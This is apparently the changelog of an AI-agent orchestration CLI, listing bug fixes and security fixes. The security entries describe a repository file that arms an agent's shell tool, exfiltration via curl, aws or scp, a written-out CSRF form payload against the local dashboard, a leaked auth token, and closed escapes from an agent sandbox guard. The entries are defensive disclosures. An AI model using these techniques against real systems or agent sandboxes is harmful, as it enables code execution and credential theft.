  - **`monomind init --minimal` (or any narrower `--only-*`/component selection) on a project previously initialised with defaults.** The stale-cleanup sweep compared a manifest-recorded name against *this run's selected subset* rather than the full shipped catalogue, so a skill this version still ships but you simply didn't select this time — e.g. `github-toolkit` under `--minimal` — was deleted outright, along with anything you had added inside it. A deselected-but-still-shipped entry is now left completely alone: no delete, no retire, no mirror change.
  - **Upgrading across a release that stops shipping a skill/command/agent you have.** A manifest-recorded name genuinely absent from the new version's catalogue is now *retired* — moved to `.monomind/backups/<timestamp>-<pid>/retired/…` — instead of `rmSync`'d. Your files survive byte-identical and findable; the entry still disappears from the agent's active skill list, which was the sweep's actual purpose.
  - Retirement is reported honestly: a `Retired: N (moved to …)` line plus every entry, on a default run with no extra flag — previously this was folded into `Files: N created`, or (on the `--minimal` path) not reported at all. `.monomind/init-manifest.json` keeps a permanent `retired` record of what was moved and where, across runs.
  - Every default mirror `init` creates alongside `.claude/skills/` is kept consistent with it: `.gemini/skills/`, `.agents/skills/`, `.kimi-code/skills/`, and `.opencode/skills/`. A retired skill is removed from each of them too (deleted outright, since a mirror holds no user content by construction — unless one is found to hold a file the source copy did not, in which case it is retired like everything else).
  - A retire that fails for any reason (e.g. the backup destination is unwritable) leaves the entry in place and records a warning; it never falls back to deleting.

### Security

- **A checked-in `.monomind/enable-terminal.json` can no longer arm `terminal_execute` on behalf of a user who never wrote it.** The opt-in flag file was resolved against the project directory, so anyone who opened a repository containing that file (deliberately committed, or copied in by mistake) got shell execution — reproduced end-to-end over the real MCP stdio path: a fixture with only that file present, no env var set, ran a real command. `terminal_execute`'s own metacharacter denylist cannot prevent exfiltration via a direct binary (`curl`, `aws`, `scp`) with no piping, so the opt-in was the only real gate, not a second layer alongside it. The flag now resolves against `~/.monomind/enable-terminal.json` (the user's home directory) instead; `MONOMIND_ENABLE_TERMINAL=1` still works unchanged. An existing in-project flag file is detected only to name it in the refusal error — it is never read for its value and never migrated to the new location (a "helpful" first-run copy would preserve the exact same attack with one extra hop and a now-persistent grant).

- **`.monomind/dashboard-token` (the dashboard's per-process auth credential) was not covered by the generated `.gitignore` in any of three independently-maintained lists, and a project inited before this fix keeps the old `.gitignore` forever unless it's re-inited.** The file is extensionless, so the existing `*.token` pattern never matched it. One instance of this reached a public GitHub repository; the exposed value had already been rotated by a subsequent dashboard restart before disclosure, so the specific committed value was not live at the time it was found, but the underlying gap was real and durable.
  Fixed in four parts: (1) a single source of truth (`MONOMIND_NEVER_COMMIT`) now feeds all three previously-disagreeing lists, and an existing project gets the missing coverage appended on its next `init` (no `--force` needed) or via `monomind doctor --fix`; (2) a freshly-inited project's `.monomind/.gitignore` is now deny-by-default (ignore everything, explicitly allow-list what's meant to be committed), so a file monomind starts writing tomorrow is protected without anyone having to remember to add it; (3) `monomind init` and `monomind doctor` (and dashboard startup itself) now detect and warn when the file is already tracked by git — `.gitignore` does nothing for an already-tracked path, so the warning gives the untrack command and states that the value must be treated as burned; (4) the dashboard now enforces file mode `0600` on every token rewrite, not only on first creation, and ensures the same `.gitignore` coverage on any paired project it propagates a token into — the mechanism by which the file reached other, never-`init`-ed repositories — plus best-effort cleanup of the token file on a clean shutdown.
  No action is required from users who have run `monomind doctor --fix` or a non-forced `monomind init` since this release; a repository where the file was ever committed should still run `git rm --cached .monomind/dashboard-token` (the tool will now tell you this) and treat any historical value as compromised regardless of rotation, since removing the file from the working tree does not remove it from git history.

- **The local dashboard's `?token=` fallback was a CSRF preflight bypass, not a credential-in-URL leak.** A mutation (`POST`/`PUT`/`DELETE`) normally needs the `x-monomind-token` HEADER, which makes the request non-simple and forces a CORS preflight that a foreign origin fails closed. `?token=` was accepted on every method, so a plain `<form method=POST action="http://localhost:PORT/api/...?token=LEAKED">` on any page you visit became a CORS-simple request — no preflight, no JavaScript — reaching every non-GET route the dashboard serves, including three code-execution paths. The query-token fallback now applies to `GET`/`HEAD` only (the four SSE streams and the dashboard's own page bootstrap still need it — `EventSource` cannot send headers); every mutation must send the header. A second, independent guard rejects any mutation whose `Sec-Fetch-Site` header is present and not `same-origin` (403, distinct from the 401 a bad token gets) — this also closes a same-host-different-port case (another local server, including a second monomind dashboard) that a plain "reject cross-site" check would have missed. Absent `Sec-Fetch-Site` (every first-party non-browser caller — hooks, the CLI, `/mastermind:*` commands) stays allowed; they still need the token. Any process already running as your user can read the token file (mode 0600) and already owns monomind's state — what this closes is the one step (needing same-origin JS) between a leaked credential and remote code execution, not a claim that the dashboard was remotely exploitable.

## [2.12.0] — 2026-09-20

### Changed

- **Both published package descriptions claimed no data leaves your machine; that was false, and is now corrected.** The `monomind` umbrella said "runs locally, no data leaves your machine" and the `@monoes/monomindcli` package said "fully local", while the update check, `doctor`'s `npm view`, consent-gated crash reports, the monoes.me upload and the embedding-model download all make outbound requests. Both descriptions now point at the new `doc/privacy.md`, which tables every outbound request and what triggers it. The platform lists in both also disagreed with the README (two named, five supported) and now match. Note that 2.12.0 was published carrying the old wording.

- **Memory project-root resolution now requires a project marker beside a bare `.monomind` ancestor, not just `.monomind` itself.** Walking up from the working directory, an ancestor's `.git` was already trusted unconditionally; a bare `.monomind` with no `package.json` (or other project marker) alongside it previously resolved too, non-deterministically — which ancestor's `.monomind` won depended on directory layout and could change between runs on the same machine. That's not "a working thing broke", it's "a coin flip became a rule": the store this resolves to is now the same every time, which is the property that makes `monomind memory list` and everything that reads through it trustworthy at all.
  **Practical effect, in the shapes we measured:** `.monomind` co-located with `package.json` (adopted, unaffected); `.git` found while walking up from a subdirectory — unaffected, **provided no bare `.monomind` sits between the working directory and that `.git`**; the walk stops at the first marker it finds and does not continue on to the enclosing git root; and a bare `.monomind` with no project marker beside it (the only shape that changes, including the composed case just described — a bare `.monomind` inside a git repo does not fall back to the enclosing `.git` root either). Only the last shape loses reachability. A store that was written under a bare-`.monomind` ancestor now reports no entries (`monomind memory list` → `No entries found`) instead of silently resolving to whichever ancestor won the old coin flip. Nothing is deleted, but to a user this looks the same as data loss.
  **Remedy, either of:** add a project marker (e.g. `package.json`) next to that `.monomind` directory, or set `MONOMIND_PROJECT_ROOT` explicitly to the intended root. `monomind doctor` diagnoses this condition on a plain run — it's registered as an always-on check, not gated behind `-c`.

## [2.12.0] — 2026-09-20
### Security

- **Org roles no longer inherit ambient `ANTHROPIC_API_KEY` / `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_BASE_URL` when running a non-Anthropic provider or CLI.** Every vendor-CLI runner (codex, grok, qwen, opencode, hermes, copilot, kimicode, pi, antigravity, crush) and the version-probe used by `monomind agent scan` built their child environment as `{ ...process.env, ...args.env }` — a spread does not delete, so `resolveProviderEnv`'s deliberate strip of these three keys for `subscription` mode (the default) was silently restored by the fallback before the child ever saw it. **Migration:** if your org relied on an exported `ANTHROPIC_API_KEY` reaching a `subscription`-provider role (the previous, unintended behaviour), set an explicit provider block instead: `provider: { kind: 'api-key', apiKeyEnv: 'ANTHROPIC_API_KEY' }`. Without this change, a role that suddenly can't see the key fails with a generic, misleading "Not logged in" rather than an explanation.

### Breaking Changes

- **Node.js >=22.12.0 is now required by every published package** (root `monomind`, `@monoes/monomindcli`, `@monoes/hooks`, `@monoes/monograph`, `@monoes/monobrowse`, `@monoes/mcp`, `@monoes/memory`, `@monoes/routing`, `@monoes/monodesign`, `monofence-ai`). The declared floor had already stopped matching reality: `engines.node` was `>=20.0.0` in some manifests, `>=18.0.0` in others, and absent from four published packages entirely. Two optional dependencies were already ahead of it: `@monoes/monodesign`'s optional `puppeteer@25.3.0` declares `engines.node ">=22.12.0"`, and `@monoes/monomindcli`'s optional `ai@7.0.59` (resolved from its declared `^7.0.58`) declares `">=22"`. `monomind doctor` reported "pass" on Node 20 the whole time; it now reports `warn`/`fail` below `22.12.0` and names the real floor. Node 20 reached EOL 2026-04-30.
  What this means in practice, measured on a real Node 20.20.2 install of the packed packages, **differs by installer and is not a blanket block**: `npm install` with `engine-strict=true` (this repo's own `.npmrc`, i.e. installing this workspace as a contributor) hard-fails with `EBADENGINE`, naming the exact package and floor. A default `npm install` (`engine-strict` unset — what `npm install monomind` gives a real end user) only **warns** `EBADENGINE` for every affected package and installs anyway. `pnpm install`/`pnpm add`, with or without `engine-strict`, gives **no warning or error at all** — it silently installs a package whose declared engines the running Node does not satisfy (measured with the closure wired through local `file:` overrides, i-090-install-p3-pnpm-v2.log — the first attempt, passing bare tarball paths directly, died on `ERR_PNPM_NO_MATCHING_VERSION` before reaching any engine check, because those bumped sibling versions are not on the real registry; it measured nothing about engines). A dedicated runtime floor check in the CLI entrypoint, so an unsupported Node actually gets stopped or clearly warned regardless of installer, is a candidate follow-up, not part of this change.
  `.github/workflows/publish-smoke-test.yml`'s smoke jobs move off Node 20 onto 22 and 26.

### Added

- `monomind init upgrade` now refreshes the generated `CLAUDE.md` and `.monomind/CAPABILITIES.md` alongside the statusline and helpers, so an existing project picks up corrections to those documents instead of keeping whatever its first `init` wrote.

### Fixed

- **The generated `CLAUDE.md` and `CAPABILITIES.md` told new projects things that were not true.** They asserted that Claude Code MUST initialize the monoswarm before complex work — nothing in `src/` requires or enforces that — and hard-coded a background-worker count that drifted from the real roster. The worker count and the command tables are now derived at doc-generation time from the actual registry rather than restated by hand, so they cannot silently go stale again.
- Optional packages are resolved with `import.meta.resolve` instead of `require.resolve`, which failed for callers whose module graph never referenced the package.

## [2.11.12] — 2026-09-19

No consumer-visible change: the CLI is identical to 2.11.11. This release
carries a release-process guard, which lives in the repo's own `scripts/` and
does not ship.

### Added

- **A publish is blocked when a `workspace:*` pin names a version that is not on npm.** 2.11.10 and 2.11.11 both shipped depending on `@monoes/monograph@1.6.6`, a version that never reached the registry — monograph was bumped for the #298 hooksPath fix by an agent org with no publish rights. Both releases were uninstallable: every consumer died with `npm error notarget No matching version found`. Nothing in the existing chain could catch it, because `pnpm publish` rewrites `workspace:*` to whatever the sibling declares without ever asking whether that version is public. `scripts/check-published-pins.mjs` now resolves each pin to the version pnpm will write into the tarball and verifies it against the registry, failing with the exact `pnpm publish` needed to fix the ordering. It is the mirror of `check-package-bumps.mjs`: that guard proves a changed package *was* bumped, and the bump is precisely what strands the pin until someone publishes it — they only work as a pair. Escape hatch: `MONOMIND_ALLOW_UNPUBLISHED_PINS=1`.

## [2.11.11] — 2026-09-19

### Changed

- **`mastermind/SKILL.md` is now a router.** Each of the five platform trees (`.agents`, `.claude`, `.gemini`, `.kimi-code`, and the CLI package's own `.claude`) inlined the full body of every mastermind workflow, so loading the router loaded all of them. It now lists the workflows and says which to load, leaving the detail in the domain skills — roughly 1000 lines of duplicated inline content drop out. Same treatment for the per-platform tool-mapping references.

### Added

- The `monomind-status` command and skill for Claude Code and kimi-code, and the kimi-code `monodesign` skill, which the other platform trees already shipped.

### Fixed

- `.gitignore` listed six specific paths under `data/` and missed `data/unknown-events.jsonl`, so 31MB of runtime run logs showed as untracked. `data/` holds nothing but runtime state and no file under it is tracked, so it is ignored wholesale — the same drift, and the same fix, that `be4051b43` applied to the `.monomind` directory.

## [2.11.10] — 2026-09-19

### Security

- **Crash reports are no longer filed without consent.** The crash reporter opened a public GitHub issue on every crash with no consent step of any kind — no prompt, no opt-out, no TTY check. Consent is now tri-state (`enabled` / `disabled` / `unanswered`), an absent config reads as `unanswered` rather than `enabled`, an interactive crash prompts once (showing the local report path first, defaulting to No), and a non-interactive crash — which is most monomind runs, including agents and CI — only ever saves locally and never prompts or files. Surfaced by `monomind crash-reporting status` and a `doctor` health check.
- **The monoes.me OAuth token is no longer written into `.mcp.json`.** It was embedded in a file that is routinely committed. `doctor` now detects the exposure, warns loudly, and keys its remediation advice on what it actually found rather than on whether a file exists.
- **Secret redaction widened.** The six credential-prefix patterns dropped a leading boundary assertion that made them miss matches, and keyword shapes now match with surrounding quotes and spaces.

### Added

- `org_complete` is gated, and every stop path records the real reason an org stopped instead of leaking the raw SDK abort string (#302).
- File-tool roots now match the Bash sandbox — a role reaches `$TMPDIR`, the org root and `policy.sandbox.allowWrite`, and nothing more (#303).
- `doctor` registers the crash-reporting check and surfaces native checks in `--help`.

### Fixed

- **Org-runtime git guard**, a series of escapes closed: the reflog allowlist examined only `argv[0]` instead of every token and is now fail-closed (#299); `git stash` is denied unconditionally below `push` (#300); `policy.git read` widened to the real read-only git surface; leaked `.git/worktrees/<name>` metadata is pruned unconditionally; an unlistable socket dir is masked instead of the socket.
- `mcp monoes-proxy` no longer dies to the 5s exit watchdog, and the monoes.me proxy speaks Streamable HTTP.
- `monograph` no longer mis-joins an absolute `core.hooksPath` (#298, monograph 1.6.6).
- 119 dashboard `onclick` handlers threw `ReferenceError` and now work.
- `init` no longer narrows an existing blanket `.monomind/` gitignore entry.
- Prompts resolve immediately on EOF instead of hanging until a fallback timeout.
- The biome `.monomind` exclusion is anchored, so worktrees underneath it still lint.
- A test bug that only appeared where `TMPDIR` is unset — the default on CI: the role-sandbox hermetic-env allowlist assigned an absent `TMPDIR` with a plain key, and because `process.env` coerces values to strings it wrote the literal string `"undefined"`. `os.tmpdir()` returned that verbatim and all 12 tests in the describe failed with `ENOENT`. It passed only on machines that happen to export `TMPDIR`.

## [2.11.9] — 2026-09-19

### Fixed

- A clean `npm install monomind` no longer reports the four high-severity `sharp<=0.35.4-rc.0` advisories. `@huggingface/transformers` is bumped from `^3.8.1` to `^4.3.0`: 3.8.1 declares `sharp: ^0.34.1`, so **no** version inside its range is safe and neither an `overrides` entry nor a sibling floor could fix it — a sibling floor made npm nest a second vulnerable copy. 4.3.0 declares `sharp: ^0.35.4`, and a consumer-style `npm audit` against it reports zero vulnerabilities. Real-world exposure was low (both advisories require processing untrusted image input, and monomind only ever hands transformers text), but the dependency-graph risk and the audit noise were real (#266: ae98ff27e).
- The local embedding loader in `embedding-operations.ts` now pins `dtype: 'q8'`, matching `memory-bridge.ts`. Since transformers v4 the default is fp32 (`onnx/model.onnx`), which the provisioning step never fetches — leaving it unset would have failed every load under `local_files_only` and silently degraded semantic search to the 128-dim hash fallback (#266).
- The `Second Brain Model` doctor check looked for `.cache/Xenova`, a model the bridge no longer uses, and so reported "Embedding model not downloaded yet" with a fully provisioned cache on disk. It now checks for `BRIDGE_EMBEDDING_MODEL`. Its fix hint also pointed at `monomind doc search`, which passes `local_files_only` and never downloads anything; it now names `monomind doc eval --provision-model`, the one command that does (#266).

### Note for existing installs

- The model cache lives at a version-keyed path inside `node_modules`, so this bump orphans any warm cache. Re-provision once with `monomind doc eval --provision-model` (~270MB); until then semantic search falls back to keyword matching, which `monomind doctor` now reports accurately.

## [2.11.8] — 2026-09-18

### Added

- `monomind org status --json` now says when the idle watchdog will stop a running org: `idle_stop_at` (ISO-8601), `idle_stop_in_seconds`, and `idle_hold`, which names the reason when there is no deadline (`disabled`, `restarting`, `pending-gate`, `pending-question`, `pending-approval`, `endpoint-reply-due`, `task-blocked`, or `unknown` when this run's daemon has not reported yet). Previously the watchdog's clock lived only in daemon memory, so a UI could show how long an item had been waiting but not how long was left to answer it. The daemon publishes the projection to `<org>/idle-watchdog.json` only when it changes, and deletes it on stop. It uses a file rather than a bus event because any bus event counts as activity and would reset the clock it reports. The hold reasons come from the same check that decides whether the watchdog waits, so the report cannot drift from its behaviour. Advertised as capability `org-idle-deadline` (#296: bc19b0f3d).

## [2.11.7] — 2026-09-18

### Added

- The org bus now carries a `tool_result` event when a tool call completes, so "did that command work?" is a field rather than an inference from the agent's own narration — a `Bash` running a test suite previously looked identical on the bus whether it passed, failed, or the binary was missing. Correlated to its invocation by the SDK's per-call id (so two concurrent `Bash` calls from one role stay distinct), carrying `ok`, duration and output capped at 4,000 characters with `redactSecrets` applied **before** the cut and truncation signalled structurally. Typed as `ToolResultEventData` in `types.ts` rather than an ad-hoc literal; runners that cannot observe tool completion simply never emit it (#289: a4bcf86e6).
- Decision traces carry a structured `kind` (`fence-block`, `gate-pending`, `policy-deny`, `approval-pending`, `approval-resolved`, `cross-org-handoff`, …). A prompt-injection fence block and a routine wait for human approval previously emitted identical structured fields, distinguishable only by matching English prose. The field is required in `recordDecision`'s signature, so the compiler guarantees every emitter populates it — which covered four emitters, not the two originally reported (#290: 071a64618).

### Fixed

- Org run memory was silently dropped when the memory backend could not load: `bridgeStoreEntry` returns `null`, `storeRunMemory` ignored it, and its caller's `catch` never fired because nothing threw. Runs completed normally, `runtime.json` and history were written, the bus looked perfect — and every `org_recall` came back empty, with the only trace printed under `MONOMIND_DEBUG=1`. A failed store now surfaces three ways that outlive the terminal: an `org-memory-store-failed` audit event, an unconditional warning, and a `memoryError` field in `runtime.json` that `org status` prints (human and `--format json`). It deliberately does not throw — by then the run has succeeded and its history is on disk, so throwing would fail a run that worked and blame history for it. The same swallowed-`null` pattern was fixed in four more callers, two of which actively misreported: `hooks post-command` returned `recorded: true` for a write that never happened *and* skipped its JSON fallback (losing the record twice), and a consolidation worker counted patterns it never wrote (#293: bc75ea501).
- `policy.git` denials now name the boundary and the allowed alternative, not just the rejected attempt. "path escapes org workdir" never said what the workdir was, so a role could only guess another path — in one rehearsal a reviewer's single `Read` was denied, it never learned the root it ran under, and it reviewed from submission messages without reading a line of code. Five denial messages fixed: workdir escape, write-scope, path-less `Grep`/`Glob`, tool allowlist and research-domain allowlist (#291: 3911a5e16).
- `monomind org branch <org> <run> <label>` read as though `<label>` named the new run; the id is generated, and the label was not merely a note — it was discarded entirely, never reaching `.branch-source`. The label is now recorded, `--format json` prints the generated id (`{"v":1,"org":…,"run":…,"from":…,"label":…}`) so a script can replay without parsing prose, and the help no longer shows a label in the id position. The label is deliberately NOT used as the run id: run ids are joined into filesystem paths and the codebase already guards that shape against traversal (#292: f4c08a3d0).
- `biome` linted nothing inside `.claude/worktrees`, which is where this repo's own workflow puts worktrees: `npx biome check` reported "Checked 0 files" and naming a file said the path was ignored. A "lint is clean" reading was really "biome refused to look" — CI was unaffected, but anyone working the recommended way was misled. The ignore pattern now excludes the `.claude` assets without excluding a worktree checkout's own source, with a repo test asserting both directions (#294: 71b3e1700).

### Changed

- `scripts/sync-claude-trees.mjs` (`pnpm run sync:claude-trees`, with `--check` in `verify` and CI) keeps the five `.claude` asset trees canonical after `init` marks files in this repo. It normalises rather than mirrors: the shipped `packages/@monomind/cli/.claude` is init's asset *source*, so copying the marked root copy into it would ship per-project markers to every npm user and make the next `init` nest a second block inside the first. It never creates and never deletes, which is how the shipped superset is protected structurally. The dead `sync-claude-assets.sh` (a hard `exit 1` since July, still referenced by three checklists) is deleted, and the parity test, skill lint and `doc/publishing.md` now name the real command (42cb52e65).
- `@monoes/hooks` 1.0.6 → 1.0.7 (the consolidation-worker fix above).

## [2.11.6] — 2026-09-18

### Fixed

- **An org you stopped could come back to life ~10 seconds later.** When a boss agent crashes, the runtime arms an auto-restart timer (10s backoff by default); when it fired it re-checked only whether a stop was *in flight*, which is never true by then, since a stop completes in far less time. Stopping an org with a restart pending therefore resurrected it: fresh sessions spending budget, `runtime.json` rewritten to `running`, a process `exit` handler re-registered, and nothing left that would ever stop it again (in a deterministic test, one stop was followed by three starts). The timer now also requires the org to still be registered — which distinguishes the two cases exactly, since a crashed boss leaves the org registered while an operator stop removes it (793e7c75f).
- `finishStop` snapshotted the resume checkpoint before releasing the run's process `exit` listener, watchdog interval and broker lease. A throw in between — which a half-started org can provoke, as it may lack the state the snapshot expects — aborted the stop and left all three behind for a run that no longer existed, and nothing surfaced it because `startOrg`'s teardown path swallows a rejecting `stopOrg` to report its own error. The three releases now happen first and both checkpoint captures are best-effort: a run that cannot be checkpointed must still stop and clean up (#288: 44b5ebb2e).

Both bugs showed up as the same CI symptom — a leaked process listener in the half-started-org test — and each was independently necessary: the run carrying only the second fix still failed.

## [2.11.5] — 2026-09-18

### Fixed

- **2.11.4 shipped the monograph fix from #279/#280 that nobody could use.** `@monoes/monograph` stayed at 1.6.4 — the version already on npm from five days earlier — while only the CLI and umbrella were bumped. Every sibling is pinned `workspace:*`, which pnpm resolves at pack time to the version that package declares, so the published CLI depended on the pre-fix tarball: `GroupedConst`/`GroupedVar` were still missing from the graph on a clean install. This release publishes `@monoes/monograph` 1.6.5 (the fix), `@monoes/routing` 1.0.5 (25 changed source files, unpublished since 2.9.24) and `monofence-ai` 1.0.3. `scripts/check-package-bumps.mjs` now fails the build — and `tests/repo/publish-bumps.test.ts` fails CI — when a publishable package has commits touching shipped files since its version was last set (#285: 4dd18df6e).
- `init --force` appended a marked copy of each skill file instead of wrapping the content already there — the same defect #276 fixed for `CLAUDE.md`, still present in the skills writer. In this repo `codex-tools.md` went 64 → 130 lines with its body present twice; six reference files doubled. The skills writer now shares #276's managed-block primitive: an older unmarked skill file is migrated in place, repeated runs are byte-identical, and a project already damaged by 2.11.4 heals back to one copy on the next `init --force`. A block belonging to another platform in a shared skill root is never absorbed (#286: e8284a668).
- `init --force` rewrote `.monomind/config.yaml` and `.monomind/CAPABILITIES.md` on every run purely to update their `Generated:` timestamp, dirtying the repo for no actionable information. When the timestamp is the only difference the file is now left untouched, mtime included; a real content change still writes and refreshes the stamp (e5a9d0238).
- The `.claude` tree the CLI ships had drifted from the root tree: 2.11.4's regenerated `settings.json` (post-bash and notification hooks, longer pre-write timeout) reached maintainers but not installed users. Synced, and the duplicated skill files 2.11.4's init produced are restored (499a90133, 08f9083c4).

### Changed

- `tests/repo/publish-bumps.test.ts` and `scripts/check-package-bumps.mjs` discover publishable packages rather than listing them, so a new package is covered the day it is added; tests and markdown do not count as shipped code, and a manifest-only commit counts only when a key consumers actually resolve changed. `MONOMIND_ALLOW_STALE_PACKAGES=1` is the escape hatch for a package that genuinely ships nothing (#285).
- The hook-order test now derives its fixture from the settings template instead of the repo's own `.claude/settings.json`, which it had required to be out of date (6adf50809).

## [2.11.4] — 2026-09-18

### Fixed

- `monomind hooks list` rendered `Priority`, `Executions` and `Last Executed` columns that nothing populates — and "Never" was actively false, e.g. the `route` hook had 500 recorded runs. Priority exists only in an in-memory registry production code never fills; there is no per-hook last-executed timestamp; and the counters that do exist are keyed by *handler*, a different name space (only 6 of 24 registry names overlap, so a join would be guesswork). The three dead columns are gone, and the real per-handler counts now appear as a "Handler invocations" section under the existing Claude Code wiring block — omitted entirely when no data has been recorded, rather than shown as zeros (e4e1fd2be).
- Four `overrides` blocks (root `package.json`, and the cli, mcp and monograph packages) were never applied but read as protection: pnpm v10 takes workspace overrides from `pnpm-workspace.yaml`, and the blocks had silently diverged from it. Every entry was either byte-identical to the live one or, in the case of `ws: "$ws"`, unresolvable — the root package declares no `ws` dependency for that syntax to match — so all four are removed with no constraint ported or weakened (`pnpm why` output for every affected package is identical before and after, and the lockfile is untouched). `scripts/check-overrides-source.mjs`, wired into `check:versions` and `prepublishOnly`, now fails when any manifest declares `overrides`/`resolutions`, reporting per entry whether it is redundant, disagrees with the applied range, or is a constraint applied nowhere (#284: 010254f96).

### Changed

- Docs cite source by symbol (`[\`orgrt/daemon.ts → startOrg\`](…/daemon.ts#startOrg)`) instead of by line number. 97 of the 200 line references in the living docs were already wrong, and `OrgDaemon` — hand-corrected to L438 a day earlier — had already moved to 444. Symbol anchors only break when a symbol is renamed or deleted, and `scripts/check-doc-refs.mjs` (wired into `verify`) then fails by name; it also rejects any reintroduced `#L<n>` anchor. 200 references converted across 13 docs, 3 dead file paths repaired. The 134 references under `doc/reports/` are left as they are: each report states the commit it was reviewed at, so its line numbers are pinned rather than rotting (b9bc46552).
- Tracked platform assets regenerated with 2.11.3: managed-block delimiters applied in place on `CLAUDE.md`, `AGENTS.md`, `.agents/shared_instructions.md` and the 14 `.claude` skill files; `CLAUDE.md` now matches the detected stack (`/packages` and pnpm, not `/src` and npm); `.claude/settings.json` gains the post-bash and notification hooks; `.kimi-code` agents drop `mode: subagent`, an opencode-only field the kimi generator ignores by design (b3b2d3397).

## [2.11.3] — 2026-09-18

### Fixed

- `hooks post-task --success true|false` recorded the wrong thing entirely: the argument parser set a declared boolean flag to `true` and left the literal `true`/`false` in the positionals, where `ctx.args[0] || ctx.flags['task-id']` picked it up as the task ID. On the invocation CLAUDE.md documents, `--task-id abc --success false` printed `Task false recorded as successful` — the real ID discarded and a *failed* task recorded as a success. A declared boolean flag now consumes an immediately following `true`/`false`; bare `--flag`, `--no-flag` and combined short flags are unchanged. This affected every boolean flag in the CLI (#269: 7c573b672).
- `mcp start --daemon` was a no-op — the flag was read, passed to the server options, and never consulted — so `-d` blocked the terminal; and an unref'd 5s force-exit watchdog in `bin/cli.js` killed *every* `mcp start`, foreground included, about 6s after startup (measured). `-d` now re-execs detached with output to `~/.monomind/mcp.log` and reports the child's own PID, and the watchdog exempts a foreground server. `mcp stop` also only deleted the PID file for a daemon, leaving it running and unreachable; it now signals the recorded PID (#267: d4354f84b).
- `mcp status` always reported `stdio`, `localhost` and port 3000 because nothing about the running server was recorded — a separate status process only had its own defaults, which also aimed the health probe at the wrong port. The server now writes its transport/host/port beside the PID file (#268: 73c16d9d8).
- `hooks list` showed every hook as "Enabled: No": the table rendered an `enabled` column the static registry never populated. Hooks now report their real state, and the separate Claude Code event wiring in `.claude/settings.json` is reported as its own labelled section (#270: ca5413378).
- `CopilotAgentRunner` always reported 0 tokens, so a copilot role looked free and its budget cap could never engage. Usage is now read from the CLI's `--usage-output-file` JSON and summed across tool-fence rounds; `cost_usd` is deliberately left unset because copilot meters in AI credits and premium requests, never USD. The same work uncovered that the runner extracted **no assistant text at all** — the real NDJSON nests payloads under `data`, which none of the four checked shapes matched (#181: ef60e0b55).
- `monomind org status` called a live run "crashed" whenever its recorded pid was stale (the pid is persisted only at start and stop, so re-attaching leaves one that answers to nothing). Liveness now falls back to the daemon heartbeat and then to recent bus activity, and says which evidence proved it live; JSON consumers still see only `running`/`crashed` (#274: 1bb4a0a9d).
- `org_task` auto-dispatch delivered only the task title when an `org_send` briefing was issued in the same turn: they were two mailbox pushes and a role consumes one per turn, so the briefing always arrived a turn late. Both now arrive as one message (500ms coalescing window, `DISPATCH_COALESCE_MS`) (#275: 0207cadbd).
- The release-gate org's hygiene step ("empty TMPDIR") could delete the scratch of the session running it — the shared temp dir also holds the agent harness's own per-session state, and wiping it broke a coordinator's shell mid-run. Hygiene is now narrow and run-scoped, with a test that fails if a wholesale-delete instruction is reintroduced into the shipped config (#273: 5b0c2931f).
- `monograph build` failing on a better-sqlite3 ABI mismatch gave advice that could not work: under a global install the loaded binary sits in the install tree, so `npm rebuild` from the project rebuilds a different copy — which is why repeated rebuilds left the file byte-identical. monomind now names the exact binary, the Node ABI it disagrees with, and the one command in the one directory that fixes it; it rebuilds automatically when the tree is writable (`MONOMIND_NO_NATIVE_REBUILD=1` opts out) and pins PATH to the running Node so the rebuild targets the right ABI; `doctor` gained a Native modules check that detects it without needing a crashed build's log (#231: e736fa6f3).
- The monobrowse `close-browser` test could hang until its 60s timeout and fail an unrelated CI job: it drove a real filesystem read with fake timers, so all 60 advances burned 120,000 fake ms in ~50ms of real time and the process-exit poll never started, leaving an unsettled promise nothing could drive. The wait is now event-driven, and a timed-out run can no longer leak a real `SIGKILL` past `restoreAllMocks` (#283: fcf1f8ccb).
- `doc/commands/security.md` and the `security` command's own subcommand list advertised a `container` scan type that hard-errors "not implemented"; removed from both (#271: feee3ce2a).
- `doc/concepts/org-runtime.md` listed 6 of the 14 accepted `runtime` values (`grok` and `hermes` were the reported gap; 8 were missing) and documented `max_turns_per_message` as defaulting to 30 when the real default is 100,000 — the knob people reach for when a role is cut off. Also corrected `idle_minutes`' effective default, the role `id` constraint (that regex governs org names, not role ids), the deprecated `gemini`/`openai` provider kinds, and stale line references (#272: b5aa32cb6).

### Note for upgraders

2.11.2's `init --force` fix migrates in place: a project initialised by an older monomind has an unmarked generated body in its `CLAUDE.md` (and `.agents/shared_instructions.md`), and the first `init --force` on 2.11.2+ replaces that body and wraps it in the current `<!-- monomind-block:… -->` delimiters instead of appending a second copy. Text you wrote outside the generated block is preserved in place; an already-doubled file heals back to one copy.

## [2.11.2] — 2026-09-18

### Fixed

- `init --force` appended a second complete copy of the managed instructions to `CLAUDE.md` (230 lines became 455 in this repo, every rule stated twice) for any project initialised before the `<!-- monomind-block:… -->` delimiter existed: the writer recognised only its own current delimiter, so an older unmarked generated body read as user content and a fresh block was appended on every run. The merge primitive now also recognises the older `# monomind:start <marker>` pair and an unmarked generated body (matched structurally, conservatively — anything not provably generated terminates the region rather than being swallowed), replaces it in place, and migrates it to the current delimiter; an already-doubled file heals back to one copy, and repeated `init --force` runs are byte-identical. Same primitive backs `.agents/shared_instructions.md` (#276: 22918c7bd).
- Every `monomind platforms` subcommand printed nothing at all — `doctor`, `plan`, `install`, `upgrade`, `uninstall`, `setup`, `docs` and even its error paths formatted their output with the colour helpers that *return* a styled string and discarded it, so `platforms doctor --platform claude` (which `doctor` tells you to run) wrote 0 bytes and exited 0. They now print (#277: e2c29d7a4).
- `platforms doctor` reported all 16 platforms as `legacy` immediately after a fresh install: legacy ownership matched any `monomind:start` marker without requiring the old *unnamed* form, and flagged the shared skill roots (`.agents/skills`, `.gemini/skills`) on mere existence though they are the current portable layout. Because `platforms install --all` gates migration on the same predicate, it was rewriting current blocks and leaving stray marker-name lines in `CLAUDE.md`/`AGENTS.md`. A fresh install now reports 0 findings (#277: e2c29d7a4).

## [2.11.1] — 2026-09-17

### Added

- **Org runtime**: every role now gets an explicit `adapter_config.model` when an org is created (mastermind-createorg templates, `org create`, and `init`'s sample org) — the user's choice, or else the latest model for its runtime (`claude-sonnet-5` for Claude, vendor defaults from `VERCEL_PROVIDERS` otherwise) — closing the drift where an unset model silently followed whatever the runtime's own default happened to be (3a6a4bca8).
